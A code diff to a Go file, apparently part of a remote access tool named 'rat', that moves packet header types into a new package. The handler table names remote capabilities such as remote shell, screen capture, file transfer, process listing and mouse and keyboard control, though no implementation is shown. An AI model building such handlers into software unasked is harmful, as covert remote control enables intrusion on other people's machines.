@@ -1,30 +1,30 @@
 package main
 
 import (
-	"rat/shared"
+	"rat/shared/network/header"
 )
 
-type PacketMap map[shared.PacketHeader]IncomingPacket
+type PacketMap map[header.PacketHeader]IncomingPacket
 
 var packets PacketMap
 
 func init() {
 	packets = make(PacketMap)
-	packets[shared.PingHeader] = PingPacket{}
-	packets[shared.SysHeader] = SysPacket{}
-	packets[shared.ScreenHeader] = ScreenPacket{}
-	packets[shared.ProcessHeader] = ProcessPacket{}
-	packets[shared.DirectoryHeader] = DirectoryPacket{}
-	packets[shared.PutFileHeader] = DownloadPacket{}
-	packets[shared.GetFileHeader] = UploadPacket{}
-	packets[shared.MouseMoveHeader] = MouseMovePacket{}
-	packets[shared.MouseHeader] = MousePacket{}
-	packets[shared.KeyHeader] = KeyPacket{}
-	packets[shared.FileHeader] = FilePacket{}
-	packets[shared.ShellHeader] = ShellPacket{}
-	packets[shared.WindowsHeader] = WindowsPacket{}
+	packets[header.PingHeader] = PingPacket{}
+	packets[header.SysHeader] = SysPacket{}
+	packets[header.ScreenHeader] = ScreenPacket{}
+	packets[header.ProcessHeader] = ProcessPacket{}
+	packets[header.DirectoryHeader] = DirectoryPacket{}
+	packets[header.PutFileHeader] = DownloadPacket{}
+	packets[header.GetFileHeader] = UploadPacket{}
+	packets[header.MouseMoveHeader] = MouseMovePacket{}
+	packets[header.MouseHeader] = MousePacket{}
+	packets[header.KeyHeader] = KeyPacket{}
+	packets[header.FileHeader] = FilePacket{}
+	packets[header.ShellHeader] = ShellPacket{}
+	packets[header.WindowsHeader] = WindowsPacket{}
 }
 
-func GetIncomingPacket(header shared.PacketHeader) IncomingPacket {
+func GetIncomingPacket(header header.PacketHeader) IncomingPacket {
 	return packets[header]
 }
